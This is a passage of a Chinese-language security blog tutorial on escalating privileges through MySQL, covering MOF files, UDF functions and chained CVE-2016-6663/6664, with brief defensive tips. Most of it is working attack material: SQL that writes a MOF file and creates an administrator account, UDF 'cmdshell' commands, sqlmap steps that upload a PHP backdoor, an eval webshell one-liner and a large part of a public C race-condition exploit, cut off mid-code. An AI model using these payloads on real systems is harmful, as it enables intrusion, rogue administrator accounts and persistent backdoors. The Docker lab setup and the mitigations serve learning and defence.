title="漏洞利用"></a>漏洞利用</h3><p>确保了前面的条件之后，我们可以先上传我们的mof文件到服务器任意目录，一般是网站允许上传的目录。</p><p>然后通过mysql语句将这个文件导入到nullevt.mof</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;F:/wamp/www/upload/test.mof&quot;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></code></pre></td></tr></table></figure><p>这里用到了dumpfile而不是outfile是因为：</p><ul><li>dumpfile只能导出一行数据</li><li>outfile可以完整的导出每行记录，并且会在行末端写入新行，并且会转义换行符。</li></ul><p>如果用outfile这个二进制可执行文件就会被破坏，所以这里我们使用了dumpfile。</p><p>然后我们分别两次将创建用户和提权命令替换poc中的命令做上述操作即可。两次使用的命令如下</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net.exe <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> <span class="hljs-number">123456</span> /add<br><br>net.exe <span class="hljs-keyword">user</span> <span class="hljs-title">localgroup</span> administrators test /add<br></code></pre></td></tr></table></figure><p>然后我们使用net user命令就可以看到我们新加入的账户，提权成功。</p><h3 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h3><ul><li>最根本的防御是过滤sql注入</li><li>如果一旦被MOF提权，这个语句会被一直执行，要彻底删掉账号需要先停止加载工作，然后删掉文件，再删掉入侵者留下的账号，最后重启服务即可。  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">net stop winmgmt<br>del c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/wbem/</span>repository<br>net start winmgmt<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x02-UDF提权"><a href="#0x02-UDF提权" class="headerlink" title="0x02 UDF提权"></a>0x02 UDF提权</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF,user defined funcion,即用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。</p><h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>通过添加用户自定义函数导出dll，然后在mysql中使用用户自定义函数以高权限账号执行命令，添加账号进行提权。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>windows2003、windowsXP、windows7</li><li>拥有mysql的insert和delete权限</li></ul><h3 id="UDF-php"><a href="#UDF-php" class="headerlink" title="UDF.php"></a>UDF.php</h3><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们要判断mysql版本，根据不同的版本：</p><ul><li><p>mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/</p></li><li><p>mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\</p></li></ul><p>也可以直接查询插件安装目录：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">%plugin%</span><br></code></pre></td></tr></table></figure><p>然后我们上传udf.php到网站中</p><p>在udf.php中将udf.dll导出到插件目录</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv01.png?raw=true"></p><p>然后执行sql语句创建用户自定义函数,并利用他执行命令提权</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">&#x27;net user test 123456 /add&#x27;</span>);<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">&#x27;net localgroup administrators test /add&#x27;</span>);<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> cmdshell; 删除函数<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;cmdshell&#x27;</span>  删除函数<br></code></pre></td></tr></table></figure><p>在将udf.dll文件导出到lib\plugin目录下时，如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> @@basedir;   <br><span class="hljs-comment">//查找到mysql的目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;</span>;   <br><span class="hljs-comment">//利用NTFS ADS创建lib目录</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>;<br><span class="hljs-comment">//利用NTFS ADS创建plugin目录</span><br></code></pre></td></tr></table></figure><h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>使用sqlmap自动化上传插件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">python sqlmap.py -u <span class="hljs-string">&#x27;xxxx&#x27;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>=<span class="hljs-regexp">/lib_mysqludf_sys.so  --file-dest=/u</span>sr<span class="hljs-regexp">/lib/my</span>sql<span class="hljs-regexp">/plugin/</span><br></code></pre></td></tr></table></figure><p>激活sys_exec函数</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;xxxx&#x27;</span> --sql-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>利用sqlmap上传后门</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">python sqlmap.py -u <span class="hljs-string">&#x27;xxxx&#x27;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>=c:<span class="hljs-regexp">/phpspy.php --file-dest=/</span>var<span class="hljs-regexp">/www/</span>spy.php<br></code></pre></td></tr></table></figure><h3 id="应对-1"><a href="#应对-1" class="headerlink" title="应对"></a>应对</h3><ul><li>最根本的防御是过滤sql注入</li><li>限制mysql的写入权限</li></ul><h2 id="0x03-CVE-2016-6663和CVE-2016-6664"><a href="#0x03-CVE-2016-6663和CVE-2016-6664" class="headerlink" title="0x03 CVE-2016-6663和CVE-2016-6664"></a>0x03 CVE-2016-6663和CVE-2016-6664</h2><p>上面两种方式条件都太过严苛，应对一些新的系统就没有用武之地了，所以再介绍一下利用下面两个CVE配合起来提权的方式，相对需求条件要宽松的多，很多情况都可以成功提权。</p><h3 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h3><p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p><h3 id="CVE-2016-6664"><a href="#CVE-2016-6664" class="headerlink" title="CVE-2016-6664"></a>CVE-2016-6664</h3><p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p><p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p><p>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p><h3 id="CVE-2016-6663利用条件"><a href="#CVE-2016-6663利用条件" class="headerlink" title="CVE-2016-6663利用条件"></a>CVE-2016-6663利用条件</h3><ul><li>1.已经getshell，获得www-data权限</li><li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li><li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li><li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li></ul><h3 id="CVE-2016-6664利用条件"><a href="#CVE-2016-6664利用条件" class="headerlink" title="CVE-2016-6664利用条件"></a>CVE-2016-6664利用条件</h3><ul><li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li><li>2.需要在mysql权限下运行才能利用</li><li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打开docker，拉取镜像tutum/lamp。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull tutum/lamp<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv02.png?raw=true"></p><p>运行docker并连接</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -d -P tutum/lamp<br>docker ps<br>docker exec -<span class="hljs-keyword">it</span> &lt;container_id&gt; /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv03.png?raw=true"></p><p>更新apt，并安装wget，gcc，libmysqlclient-dev</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">apt <span class="hljs-keyword">update</span><br>apt install -y wget gcc libmysqlclient-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv04.png?raw=true"></p><p>这里假设我们已经拿到一个www-data这种低权限的webshell和一个拥有create,drop,insert,select权限的数据库账号，密码。</p><p>所以我们手动写入webshell：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>webshell.php<br></code></pre></td></tr></table></figure><p>然后将<?php @eval($_POST[123456]);?>写入保存，并赋予我们任何用户在web路径的可读可写可执行权限。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod -R <span class="hljs-number">777</span> <span class="hljs-regexp">/var/</span>www/html<br></code></pre></td></tr></table></figure><p>然后我们进入数据库，添加一个对test库有create,drop,insert,select权限的test用户，密码为123456</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> test;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>; <br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">create</span>,<span class="hljs-keyword">drop</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> test.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv05.png?raw=true"></p><p>配置好之后，我们将apache2和mysql服务重启</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">service <span class="hljs-built_in">restart</span> apache2<br>service <span class="hljs-built_in">restart</span> mysql<br></code></pre></td></tr></table></figure><p>然后我们退出当前连接，将配置好的容器提交为一个新容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit dfdd<span class="hljs-number">42</span>e<span class="hljs-number">8</span>e<span class="hljs-number">688</span> leticia<span class="hljs-number">0</span>/lamp<br></code></pre></td></tr></table></figure><p>然后以将新容器的80端口映射到8080端口，3306映射到3306端口的方式运行容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8080</span>:<span class="hljs-number">80</span> -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> leticia<span class="hljs-number">0</span>/lamp<br></code></pre></td></tr></table></figure><p>通过本机访问docker的web应用，看到如下界面说明环境搭建成功。</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv06.png?raw=true"></p><h3 id="www-data权限提升为mysql权限"><a href="#www-data权限提升为mysql权限" class="headerlink" title="www-data权限提升为mysql权限"></a>www-data权限提升为mysql权限</h3><p>接下来我们用菜刀连接刚才的webshell</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv07.png?raw=true"></p><p>使用whoami可以看到当前权限是www-data</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv08.png?raw=true"></p><p>运行ls -ld，可以发现我们目前的www-data只有对html目录是可读可写可执行的，所以我们需要将exp写入html目录</p><p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv09.png?raw=true"></p><p>CVE-2016-6663 exp网址： <a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></p><p>CVE=2016-6663 exp：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;grp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;mysql.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/inotify.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXP_PATH          <span class="hljs-meta-string">&quot;/tmp/mysql_privesc_exploit&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EXP_DIRN          <span class="hljs-meta-string">&quot;mysql_privesc_exploit&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYSQL_TAB_FILE    EXP_PATH <span class="hljs-meta-string">&quot;/exploit_table.MYD&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYSQL_TEMP_FILE   EXP_PATH <span class="hljs-meta-string">&quot;/exploit_table.TMD&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SUID_SHELL     EXP_PATH <span class="hljs-meta-string">&quot;/mysql_suid_shell.MYD&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_DELAY 1000    <span class="hljs-comment">// can be used in the race to adjust the timing if necessary</span></span><br><br>MYSQL *conn;  <span class="hljs-comment">// DB handles</span><br>MYSQL_RES *res;<br>MYSQL_ROW row;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cnt;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">intro</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">printf</span>( <br>        <span class="hljs-string">&quot;\033[94m\n&quot;</span><br>        <span class="hljs-string">&quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;</span><br>        <span class="hljs-string">&quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;</span><br>        <span class="hljs-string">&quot;CVE-2016-6663 / CVE-2016-5616\n\n&quot;</span><br>        <span class="hljs-string">&quot;For testing purposes only. Do no harm.\n\n&quot;</span><br><span class="hljs-string">&quot;Discovered/Coded by:\n\n&quot;</span><br><span class="hljs-string">&quot;Dawid Golunski \n&quot;</span><br><span class="hljs-string">&quot;http://legalhackers.com&quot;</span><br>        <span class="hljs-string">&quot;\033[0m\n\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *argv0)</span> </span>&#123;<br>    <span class="hljs-built_in">intro</span>();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n\n%s user pass db_host database\n\n&quot;</span>, argv0);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mysql_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sql_cmd, <span class="hljs-keyword">int</span> silent)</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">if</span> (!silent) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s \n&quot;</span>, sql_cmd);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">mysql_query</span>(conn, sql_cmd)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-built_in">mysql_error</span>(conn));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    res = <span class="hljs-built_in">mysql_store_result</span>(conn);<br>    <span class="hljs-keyword">if</span> (res&gt;<span class="hljs-number">0</span>) <span class="hljs-built_in">mysql_free_result</span>(res);<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">int</span> randomnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> io_notified = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> myd_handle;<br>    <span class="hljs-keyword">int</span> wpid;<br>    <span class="hljs-keyword">int</span> is_shell_suid=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-comment">/* io notify */</span><br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4096</span>] __attribute__((<span class="hljs-built_in">aligned</span>(<span class="hljs-number">8</span>)));<br>    <span class="hljs-keyword">int</span> num_read;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inotify_event</span> *<span class="hljs-title">event</span>;</span><br>    <span class="hljs-comment">/* credentials */</span><br>    <span class="hljs-keyword">char</span> *user     = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">char</span> *password = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">char</span> *db_host  = argv[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> *database = argv[<span class="hljs-number">4</span>];<br><br><br>    <span class="hljs-comment">// Disable buffering of stdout</span><br>    <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// Get the params</span><br>    <span class="hljs-keyword">if</span> (argc!=<span class="hljs-number">5</span>) &#123;<br><span class="hljs-built_in">usage</span>(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <br>    <span class="hljs-built_in">intro</span>();<br>    <span class="hljs-comment">// Show initial privileges</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Starting the exploit as: \n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;id&quot;</span>);<br><br>    <span class="hljs-comment">// Connect to the database server with provided credentials</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;</span>, database, user, db_host);<br>    conn = <span class="hljs-built_in">mysql_init</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">mysql_real_connect</span>(conn, db_host, user, password, database, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%s\n&quot;</span>, <span class="hljs-built_in">mysql_error</span>(conn));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Prepare tmp dir</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] Creating exploit temp directory %s\n&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span> EXP_DIRN);<br>    <span class="hljs-built_in">umask</span>(<span class="hljs-number">000</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;rm -rf /tmp/&quot;</span> EXP_DIRN <span class="hljs-string">&quot; &amp;&amp; mkdir /tmp/&quot;</span> EXP_DIRN);<br>    <span 